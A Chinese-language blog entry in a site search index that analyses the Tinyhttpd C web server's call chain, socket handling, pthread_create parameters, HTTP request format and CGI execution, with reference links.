    <content type="html"><![CDATA[<h1 id="函数调用分析"><a href="#函数调用分析" class="headerlink" title="函数调用分析"></a>函数调用分析</h1><ul><li>main函数调用了start函数进行服务器端的监听套接字绑定<ul><li>start函数包含了套接字的创建、设置、绑定等，牵扯到网络编程的一些知识点，比如sockaddr_in结构体、bind函数等</li></ul></li><li>主函数进入死循环，使用accept函数阻塞等待客户端的网络连接请求</li><li>使用pthread_creat函数创建线程</li><li>accept_request函数判断http请求是post还是get，从而决定是直接向client传送文件还是执行cgi脚本</li><li>execute_cgi函数是该项目的精髓，包含了匿名管道、进程间通信、fork进程、环境变量等知识</li><li><strong>对代码的注释的repository：</strong> <a href="https://github.com/LaPhilosophie/Tinyhttpd">https://github.com/LaPhilosophie/Tinyhttpd</a></li></ul><h1 id="一些分析图"><a href="#一些分析图" class="headerlink" title="一些分析图"></a>一些分析图</h1><p><img src="/image/Snipaste_2022-08-23_23-22-55.png" alt="函数调用链分析"></p><p><img src="/image/tinyhttpd-work-flow1.png" alt="管道的分析图"></p><h1 id="网络编程与套接字"><a href="#网络编程与套接字" class="headerlink" title="网络编程与套接字"></a>网络编程与套接字</h1><ul><li>套接字A用于监听和接受客户端请求，绑定监听的ip地址和端口，阻塞等待客户端连接请求</li><li>如果套接字A接收到了客户端的连接请求，那么服务器会创建出新的套接字B，用于和客户端的通信，而之前的监听套接字A继续监听，如果有别的来自客户端的连接请求，那么会继续创建出和客户端通信的套接字C、D、E…</li><li>服务器与客户端的通信模型图：</li></ul><p><img src="https://docs.oracle.com/cd/E38902_01/html/E38880/figures/7099.png"></p><h1 id="进程相关知识"><a href="#进程相关知识" class="headerlink" title="进程相关知识"></a>进程相关知识</h1><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs delphi">int pthread_create(pthread_t *thread,<br>                   <span class="hljs-keyword">const</span> pthread_attr_t *attr,<br>                   void *<span class="hljs-comment">(*start_routine) (void *)</span>,<br>                   void *arg);<br><br></code></pre></td></tr></table></figure><p>上述函数的四个参数分别为：</p><ul><li>线程的地址</li><li>手动设置新建线程的属性，若为NULL，那么会采用系统的默认属性值设置线程属性</li><li>以函数指针的方式指明新建线程需要执行的函数，形参和返回值的类型都必须为 void* 类型</li><li>arg是函数的参数</li></ul><p>线程创建成功时返回0，失败为非0</p><h1 id="http协议请求头格式"><a href="#http协议请求头格式" class="headerlink" title="http协议请求头格式"></a>http协议请求头格式</h1><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;method&#125;</span><span class="xml"> </span><span class="hljs-template-variable">&#123;path&#125;</span><span class="xml"> </span><span class="hljs-template-variable">&#123;http_version&#125;</span><span class="xml">(CRLF)</span><br><span class="xml"></span><span class="hljs-template-variable">&#123;header_name&#125;</span><span class="xml">: </span><span class="hljs-template-variable">&#123;header_value&#125;</span><span class="xml">(CRLF)</span><br><span class="xml">...more header info(CRLF)</span><br><span class="xml">(CRLF)</span><br><span class="xml"></span><span class="hljs-template-variable">&#123;content&#125;</span><br></code></pre></td></tr></table></figure><p>第一行（消息行）包含 HTTP 方法和目标，例：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">GET <span class="hljs-regexp">/mysite/my</span>directory<span class="hljs-regexp">/index.html HTTP/</span><span class="hljs-number">1.1</span>\r\n<br></code></pre></td></tr></table></figure><p>格式中的变量说明</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-function"><span class="hljs-keyword">method</span>:</span> GET,POST,PUT,DELETE 等等<br>path: URL路径部分，如：/<span class="hljs-keyword">index</span>.html<br>version：如：http/<span class="hljs-number">1.1</span><br>header_name: 如：Host<br>header_value: 如： www.xxx.com<br></code></pre></td></tr></table></figure><h1 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h1><p>可以通过chrome浏览器调试，先后顺序分别为：f12、network、preserve log、name、header</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://blog.csdn.net/wenqian1991/article/details/46011357">https://blog.csdn.net/wenqian1991/article/details/46011357</a></li><li><a href="https://phenix3443.github.io/notebook/c/tinyhttpd-analysis.html">https://phenix3443.github.io/notebook/c/tinyhttpd-analysis.html</a><br><img src="/image/tinyhttpd-work-flow.png"></li></ul><p><img src="/image/20150527211620041.png"></p>]]></content>
    
    
    <categories>
      
      <category>C语言</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
